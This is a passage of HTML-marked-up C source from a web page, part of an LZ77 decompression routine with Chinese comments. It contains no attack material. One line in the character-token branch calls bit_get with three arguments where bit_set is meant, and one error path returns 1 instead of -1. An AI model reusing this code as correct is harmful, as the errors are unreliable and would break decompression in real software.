class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-221\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_BUFLEN_BITS</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-222\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-223\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">*</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_BUFLEN_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-224\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">bit_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-225\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-226\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-227\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-228\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">next</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x00</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-229\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_NEXT_BITS</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-230\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-231\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">*</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_NEXT_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-232\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">bit_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-233\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-234\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-235\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-236\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*确保偏移和长度对系统有正确的字节排序*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-237\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ntohl</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-238\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ntohl</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-239\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-240\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*将短语从滑动窗口写入原始数据缓冲区*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-241\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-242\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-243\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-244\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">realloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">length</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-245\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-246\"><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">free</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-247\"><span class=\"crayon-h\">                    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-248\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-249\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">orig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-250\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-251\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-252\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-253\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">malloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">length</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-254\"><span class=\"crayon-h\">                    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-255\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-256\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-257\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-258\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-259\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-260\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-261\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">/*在前向缓冲区中记录每个符号，直到准备更新滑动窗口*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-262\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-263\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-264\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-265\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">/*调整剩余符号总数*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-266\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-267\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-268\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-269\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*将不匹配的符号写入原始数据缓冲区*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-270\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-271\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-272\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-273\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-274\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-275\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">/*仍需在前向缓冲区中记录此符号*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-276\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-277\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-278\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">/*调整剩余字符总数*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-279\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-280\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-281\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*调整短语长度*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-282\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">length</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-283\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-284\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-285\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-286\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*处理的是字符标记*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-287\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">next</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x00</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-288\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_NEXT_BITS</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-289\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-290\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">*</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_NEXT_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-291\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-292\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-293\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-294\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-295\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*将字符写入原始数据缓冲区*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-296\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">opos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-297\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-298\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">realloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-299\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-300\"><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">free</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-301\"><span class=\"crayon-h\">                    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-302\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-303\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">orig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-304\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-305\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-306\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-307\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">malloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-308\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-309\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-310\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-311\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-312\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-313\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*在前向缓冲区中记录当前字符*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-314\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-315\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span 